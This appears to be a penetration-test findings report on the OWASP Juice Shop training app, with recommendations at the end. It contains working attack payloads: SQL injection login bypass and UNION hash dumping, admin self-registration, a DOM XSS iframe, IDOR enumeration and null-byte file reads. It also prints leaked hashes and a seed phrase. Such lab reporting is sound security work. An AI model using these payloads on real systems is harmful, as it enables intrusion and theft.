## [CRITICAL] 1. SQL Injection → Admin Authentication Bypass
- **Location:** POST `/rest/user/login`
- **Attack:** Email = `' OR 1=1--`, Password = `anything`
- **Code:**
```js
fetch('/rest/user/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:"' OR 1=1--",password:'x'})}).then(r=>r.text())
```
- **Proof:** Returned admin JWT for `admin@juice-sh.op` (id=1, role=admin). Token placed in `localStorage.token` — full admin access.
  - Decoded payload: `{id:1,email:'admin@juice-sh.op',role:'admin',password:'0192023a7bbd7325 0516f069df18b500'}` (MD5 of `admin123`).
- **Impact:** Total authentication bypass; attacker controls any account without credentials.

## [CRITICAL] 2. SQL Injection (UNION) → Dump Users & Password Hashes
- **Location:** GET `/rest/products/search?q=<payload>`
- **Attack:** `'))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--`
- **Proof:** Response contained e.g. `{"id":1,"name":"admin@juice-sh.op","description":"6b5e7fab1c26eb98ced96aa5f7cae5d7",...}` — password hashes for every user directly in the JSON.
- **Impact:** Offline hash cracking for every user; complete credential compromise.

## [CRITICAL] 3. Privilege Escalation via Registration
- **Location:** POST `/api/Users`
- **Attack:** Include `"role":"admin"` in the signup body.
- **Code:**
```js
fetch('/api/Users',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'pwn@evil.com',password:'x',passwordRepeat:'x',role:'admin'})})
```
- **Proof:** 201 response — created user id=23 with `"role":"admin"`.
- **Impact:** Anyone on the internet can mint themselves an administrator account. Solved the "Admin Registration" challenge.

## [CRITICAL] 4. DOM XSS in Search Parameter
- **Location:** `http://127.0.0.1:3000/#/search?q=<payload>`
- **Attack:** `<iframe src="javascript:alert(`xss`)">`
- **Proof:** Browser rendered the iframe; `javascript:alert(\`xss\`)` executed repeatedly — dozens of alert dialogs were caught by the auto-dismiss handler (see `Auto-closed JavaScript dialogs: [alert] xss` × many). iframe src captured in DOM: `javascript:alert(\`xss\`)`.
- **Impact:** Arbitrary JS executes in victim browser → session theft, CSRF, phishing.

## [HIGH] 5. IDOR — Direct Object Reference on Users & Baskets
- **Location:** `/api/Users/{id}`, `/rest/basket/{id}`
- **Attack (users):** `fetch('/api/Users/2',{headers:{Authorization:'Bearer '+localStorage.token}})` returns jim@juice-sh.op's full record. Sequential IDs 1–7 enumerated all users including `bender`, `ciso`, `support`, `bkimminich`.
- **Attack (baskets):** `fetch('/rest/basket/2',{headers:{Authorization:'Bearer '+localStorage.token}})` returned basket of UserId=2 with Raspberry Juice × 2.
- **Impact:** Arbitrary horizontal/vertical access to other customers' PII and carts.

## [HIGH] 6. Directory Listing & Poison Null Byte on /ftp
- **Location:** `/ftp/` (robots.txt disallows but listing is public)
- **Attack:** `/ftp/package.json.bak%2500.md`, `/ftp/coupons_2013.md.bak%2500.md`, `/ftp/eastere.gg%2500.md`, `/ftp/suspicious_errors.yml%2500.md`, `/ftp/acquisitions.md`.
- **Proof:** All returned 200 with full contents (package.json source, coupon codes, internal confidential acquisitions memo, SIEM signature file).
- **Impact:** Information disclosure, source code leak, coupon forgery; solved Forgotten Developer Backup, Forgotten Sales Backup, Poison Null Byte, Easter Egg, Misplaced Signature File.

## [HIGH] 7. Sensitive Data Exposure — BTC Seed Phrase in Feedback
- **Location:** `GET /api/Feedbacks`
- **Proof:** Feedback id=4 contains a 12-word BIP-39 seed phrase: `purpose betray marriage blame crunch monitor spin slide donate sport lift clutch` and wallet path `/juicy-nft` (user `***ereum@juice-sh.op`).
- **Impact:** Attacker can import the wallet and steal its contents.

## [HIGH] 8. Password Hash Leak via change-password
- **Location:** `GET /rest/user/change-password?new=X&repeat=X` with Authorization header
- **Proof:** Response JSON includes full user record with `"password":"6b5e7fab1c26eb98ced96aa5f7cae5d7"` (admin's MD5).
- **Impact:** Excessive data exposure — the session owner's password hash is returned on every password change.

## [MEDIUM] 9. Application Configuration Exposed
- **Location:** `GET /rest/admin/application-configuration`
- **Proof:** No auth required — returned full `config` object (server, application, chatBot, social, ctf, hackingInstructor, etc.). Reveals internal settings intended for admins.
- **Impact:** Reconnaissance goldmine for further attacks.

## [MEDIUM] 10. Public Prometheus Metrics
- **Location:** `GET /metrics` (status 200, unauthenticated)
- **Proof:** Returned Prometheus metrics (`file_uploads_count`, `juiceshop_startup_duration_seconds`, ...).
- **Impact:** Operational telemetry leak; aids attacker reconnaissance.

## [LOW] 11. /robots.txt Discloses Hidden Directory

## Recommendations (high-priority)
- Parameterize ALL SQL queries (login, search).
- Server-side whitelist of allowed `role` values on registration.
- Sanitize + context-encode search input; block `javascript:` URIs in Angular `bypassSecurityTrustResourceUrl`.
- Enforce per-resource authorization (user can only access own basket/profile).
- Block access to `/ftp`, remove backup and confidential files from the web root.
- Scrub feedback / user-generated content for credentials & secrets.
- Never return password hashes in any API response; strip from user serializer.
- Require auth on `/rest/admin/application-configuration` and `/metrics` (or bind metrics to an internal network).
